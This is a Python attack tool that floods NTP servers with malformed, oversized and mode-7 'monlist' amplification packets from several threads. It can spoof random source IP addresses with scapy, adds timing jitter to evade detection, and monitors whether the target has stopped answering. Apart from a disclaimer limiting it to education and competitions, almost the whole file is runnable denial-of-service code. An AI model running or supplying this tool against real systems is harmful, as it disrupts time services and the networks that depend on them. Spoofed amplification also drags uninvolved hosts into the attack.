#!/usr/bin/env python3

"""
NTP Kiss-of-Death (KoD) Attack Script
For educational and competition use only.

This script demonstrates various NTP KoD techniques that could potentially
crash or impair vulnerable NTP server implementations.
"""

import socket
import random
import time
import argparse
import threading
import struct
from scapy.all import IP, UDP, Raw, send

# ANSI color codes for output
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    ENDC = '\033[0m'

def parse_arguments():
    """Parse command-line arguments"""
    parser = argparse.ArgumentParser(description='NTP Kiss-of-Death Attack Demonstration')
    parser.add_argument('--target', type=str, required=True, help='Target NTP server IP')
    parser.add_argument('--port', type=int, default=123, help='Target NTP port (default: 123)')
    parser.add_argument('--threads', type=int, default=4, help='Number of threads to use')
    parser.add_argument('--duration', type=int, default=30, help='Attack duration in seconds')
    parser.add_argument('--technique', type=str, default='all', 
                        choices=['all', 'malformed', 'rate', 'large', 'fragment', 'restrict', 'amplification'],
                        help='Attack technique to use')
    parser.add_argument('--intensity', type=int, default=5, choices=range(1, 11),
                        help='Attack intensity (1-10)')
    parser.add_argument('--spoof', action='store_true', help='Enable IP spoofing')
    return parser.parse_args()

def get_spoofed_ip():
    """Generate a random IP address for spoofing"""
    # Avoid private IP ranges and other special addresses
    first_octet = random.choice([1, 2, 3, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224])
    return f"{first_octet}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

class NTPKoD:
    """NTP Kiss-of-Death attack implementation"""
    
    def __init__(self, target, port=123, threads=4, intensity=5, spoof=False):
        """Initialize the attack parameters"""
        self.target = target
        self.port = port
        self.threads = threads
        self.intensity = intensity
        self.stop_event = threading.Event()
        self.spoof = spoof
        
        # Calculate parameters based on intensity (1-10)
        self.packet_rate = 5 + (intensity * 5)  # packets per second
        self.burst_size = 10 + (intensity * 10)  # packets per burst
        
        print(f"{Colors.BLUE}[*] NTP KoD configured for {target}:{port}{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] Using {threads} threads at intensity level {intensity}{Colors.ENDC}")
        if self.spoof:
            print(f"{Colors.BLUE}[*] IP spoofing enabled{Colors.ENDC}")
    
    def create_malformed_packet(self):
        """Create a malformed NTP packet that might trigger implementation bugs"""
        # Start with a standard v4 client packet
        data = bytearray(48)
        
        # Set the first byte (LI, VN, Mode) to a malformed value
        # 0xDC = 11011100 - Invalid LI (3), Version (7), Mode (4)
        data[0] = 0xDC
        
        # Fill the rest with random garbage
        for i in range(1, 48):
            data[i] = random.randint(0, 255)
            
        # Optionally corrupt specific fields known to cause issues
        # Stratum (byte 1) - set to invalid value 0 or 16+
        data[1] = random.choice([0] + list(range(16, 256)))
        
        # Root delay and root dispersion - could be set to extreme values
        # Bytes 4-7 and 8-11
        struct.pack_into('>I', data, 4, 0xFFFFFFFF)  # Max root delay
        struct.pack_into('>I', data, 8, 0xFFFFFFFF)  # Max root dispersion
        
        return bytes(data)
    
    def create_large_packet(self):
        """Create an oversized NTP packet"""
        # Standard header (48 bytes) + extra data
        # Some implementations might not handle packets larger than expected
        extra_size = random.randint(100, 1400)  # Additional bytes
        header = bytearray(48)
        
        # Set as NTP v4, mode 3 (client)
        header[0] = 0x23  # 00100011
        
        # Fill the rest with pattern data
        for i in range(1, 48):
            header[i] = i % 256
            
        # Create extra data with incrementing pattern
        extra = bytearray(extra_size)
        for i in range(extra_size):
            extra[i] = (i + 48) % 256
            
        return bytes(header + extra)
    
    def create_restrict_packet(self):
        """Create a packet that might trigger rate limiting/restriction"""
        # This creates a valid-looking NTP packet but with unusual values
        data = bytearray(48)
        
        # Standard v4 client request
        data[0] = 0x23  # 00100011 (v4, mode 3)
        
        # Set unusual poll value (normally 4-17)
        data[2] = random.choice([1, 2, 3, 18, 19, 20])
        
        # Set precision to an unusual value
        data[3] = random.randint(200, 255)
        
        return bytes(data)
    
    def create_fragmented_header(self):
        """Create a packet with unusual/fragmented header values"""
        data = bytearray(48)
        
        # Set as v3, mode 3 (client) - some servers might handle v3 differently
        data[0] = 0x1B  # 00011011
        
        # Make it look like a legitimate client request but with
        # specific fields set to edge-case values
        
        # Set reference timestamp fields to unusual values
        # (bytes 16-23)
        for i in range(16, 24):
            data[i] = 0xFF
            
        return bytes(data)
    
    def create_amplification_packet(self):
        """Create a packet that might trigger amplification responses"""
        data = bytearray(48)
        
        # Set as mode 7 (private/implementation-specific commands)
        data[0] = 0x27  # 00100111
        
        # Request monlist or other high-response commands
        data[1] = 0x00  # Request code for monlist in some implementations
        
        # Add some random data to make it look more legitimate
        for i in range(2, 48):
            data[i] = random.randint(0, 255)
            
        return bytes(data)
    
    def attack_thread(self, thread_id, technique):
        """Thread function to execute the attack"""
        packets_sent = 0
        start_time = time.time()
        
        print(f"{Colors.GREEN}[+] Thread {thread_id} started using technique: {technique}{Colors.ENDC}")
        
        while not self.stop_event.is_set():
            try:
                # Choose packet creation function based on technique
                if technique == 'malformed':
                    packet_data = self.create_malformed_packet()
                elif technique == 'large':
                    packet_data = self.create_large_packet()
                elif technique == 'restrict':
                    packet_data = self.create_restrict_packet()
                elif technique == 'fragment':
                    packet_data = self.create_fragmented_header()
                elif technique == 'amplification':
                    packet_data = self.create_amplification_packet()
                else:  # Default or 'rate' technique
                    packet_data = self.create_malformed_packet()
                
                # Send a burst of packets
                for _ in range(self.burst_size):
                    try:
                        # Create a different source port for each packet
                        src_port = random.randint(10000, 65000)
                        
                        # Use scapy for more control over packet construction
                        if self.spoof:
                            src_ip = get_spoofed_ip()
                            packet = (
                                IP(src=src_ip, dst=self.target) /
                                UDP(sport=src_port, dport=self.port) /
                                Raw(load=packet_data)
                            )
                        else:
                            packet = (
                                IP(dst=self.target) /
                                UDP(sport=src_port, dport=self.port) /
                                Raw(load=packet_data)
                            )
                        
                        send(packet, verbose=0)
                        packets_sent += 1
                        
                        # Add a small random delay between packets in a burst
                        if random.random() < 0.3:  # 30% chance of delay
                            time.sleep(random.uniform(0.001, 0.01))
                            
                    except socket.error as e:
                        if hasattr(e, 'errno') and e.errno == 55:  # No buffer space
                            time.sleep(0.1)  # Back off temporarily
                        else:
                            print(f"{Colors.RED}[!] Socket error: {e}{Colors.ENDC}")
                    except Exception as e:
                        print(f"{Colors.RED}[!] Error sending packet: {e}{Colors.ENDC}")
                
                # Rate limiting to prevent overwhelming local resources
                if packets_sent % 100 == 0:
                    print(f"{Colors.YELLOW}[*] Thread {thread_id}: Sent {packets_sent} packets " +
                          f"({packets_sent/(time.time()-start_time):.2f} pps){Colors.ENDC}")
                
                # Sleep to maintain the desired packet rate
                # Add jitter to evade pattern detection
                jitter = random.uniform(0.8, 1.2)
                time.sleep((1.0 / self.packet_rate) * jitter)
                
            except Exception as e:
                print(f"{Colors.RED}[!] Thread {thread_id} error: {e}{Colors.ENDC}")
                time.sleep(1)  # Back off on error
        
        print(f"{Colors.GREEN}[+] Thread {thread_id} finished after sending {packets_sent} packets{Colors.ENDC}")
    
    def run(self, technique='all', duration=30):
        """Run the KoD attack with the specified technique"""
        print(f"{Colors.BLUE}[*] Starting NTP KoD attack on {self.target}:{self.port}{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] Attack technique: {technique}, Duration: {duration}s{Colors.ENDC}")
        
        # Reset the stop event
        self.stop_event.clear()
        
        # Create threads based on selected technique
        threads = []
        
        if technique == 'all':
            # Use all techniques, distributed across threads
            techniques = ['malformed', 'rate', 'large', 'fragment', 'restrict', 'amplification']
            for i in range(self.threads):
                # Assign techniques in round-robin fashion
                t = threading.Thread(
                    target=self.attack_thread,
                    args=(i+1, techniques[i % len(techniques)])
                )
                threads.append(t)
                t.start()
        else:
            # Use the specified technique for all threads
            for i in range(self.threads):
                t = threading.Thread(
                    target=self.attack_thread,
                    args=(i+1, technique)
                )
                threads.append(t)
                t.start()
        
        # Monitor the NTP service to detect when it goes down
        monitor_thread = threading.Thread(target=self.monitor_target)
        monitor_thread.start()
        
        try:
            # Run for the specified duration
            time.sleep(duration)
        except KeyboardInterrupt:
            print(f"{Colors.YELLOW}[!] Attack interrupted by user{Colors.ENDC}")
        
        # Stop all threads
        print(f"{Colors.BLUE}[*] Stopping attack...{Colors.ENDC}")
        self.stop_event.set()
        
        # Wait for all threads to finish
        for t in threads:
            t.join()
        
        # Stop the monitor thread
        monitor_thread.join(timeout=2)
        
        print(f"{Colors.GREEN}[+] NTP KoD attack completed{Colors.ENDC}")
    
    def monitor_target(self):
        """Monitor the target NTP server to detect when it becomes unresponsive"""
        check_interval = 2  # seconds between checks
        consecutive_failures = 0
        last_success = time.time()
        
        # Standard NTP client request
        ntp_request = b'\x23' + b'\x00' * 47
        
        while not self.stop_event.is_set():
            try:
                # Create UDP socket for NTP
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(1.0)  # Short timeout
                
                # Send NTP request
                sock.sendto(ntp_request, (self.target, self.port))
                
                # Try to receive response
                _, _ = sock.recvfrom(1024)
                
                # If we got here, the server is still responding
                consecutive_failures = 0
                last_success = time.time()
                
                print(f"{Colors.GREEN}[+] NTP service is still responsive{Colors.ENDC}")
                
            except socket.timeout:
                # No response received
                consecutive_failures += 1
                downtime = time.time() - last_success
                
                if consecutive_failures >= 3:
                    print(f"{Colors.RED}[!] NTP service appears to be DOWN! " +
                          f"(No response for {downtime:.1f}s){Colors.ENDC}")
                else:
                    print(f"{Colors.YELLOW}[!] NTP service timeout " +
                          f"({consecutive_failures}/3 consecutive failures){Colors.ENDC}")
                    
            except Exception as e:
                print(f"{Colors.RED}[!] Error monitoring NTP service: {e}{Colors.ENDC}")
            
            finally:
                sock.close()
                time.sleep(check_interval)


def print_banner():
    """Print script banner"""
    banner = """
    ╔═╗╔╦╗╔═╗  ╦╔═╦╔═╗╔═╗  ╔═╗╔═╗  ╔╦╗╔═╗╔═╗╔╦╗╦ ╦
    ║╣ ║║║╠═╝  ╠╩╗║╚═╗╚═╗  ║ ║╠╣    ║║║╣ ╠═╣ ║ ╠═╣
    ╚═╝╩ ╩╩    ╩ ╩╩╚═╝╚═╝  ╚═╝╚    ═╩╝╚═╝╩ ╩ ╩ ╩ ╩
    
    NTP Kiss-of-Death Attack Tool - v1.1
    For cybersecurity competitions and educational use only
    """
    print(f"{Colors.RED}{banner}{Colors.ENDC}")


def print_disclaimer():
    """Print legal disclaimer"""
    disclaimer = """
    !!! LEGAL DISCLAIMER !!!
    
    This tool is provided for EDUCATIONAL PURPOSES ONLY to demonstrate
    potential vulnerabilities in NTP implementations. Using this tool
    against any targets without EXPLICIT AUTHORIZATION is ILLEGAL.
    
    Use only in authorized cybersecurity competitions or controlled lab
    environments where explicit permission has been granted.
    
    The author accepts no liability for misuse or damage caused by this tool.
    """
    print(f"{Colors.YELLOW}{disclaimer}{Colors.ENDC}")


def main():
    """Main function"""
    print_banner()
    print_disclaimer()
    
    # Parse command-line arguments
    args = parse_arguments()
    
    # Validate target IP
    try:
        socket.inet_aton(args.target)
    except socket.error:
        print(f"{Colors.RED}[!] Invalid target IP: {args.target}{Colors.ENDC}")
        return
    
    # Confirm the user wants to continue
    print("\nWARNING: This will attempt to disrupt the NTP service. Continue?")
    confirmation = input("Type 'YES' to confirm: ")
    if confirmation != "YES":
        print(f"{Colors.YELLOW}[*] Attack aborted by user{Colors.ENDC}")
        return
    
    # Create and run the KoD attack
    kod = NTPKoD(
        target=args.target,
        port=args.port,
        threads=args.threads,
        intensity=args.intensity,
        spoof=args.spoof
    )
    
    kod.run(technique=args.technique, duration=args.duration)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Script terminated by user{Colors.ENDC}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Unhandled error: {e}{Colors.ENDC}")
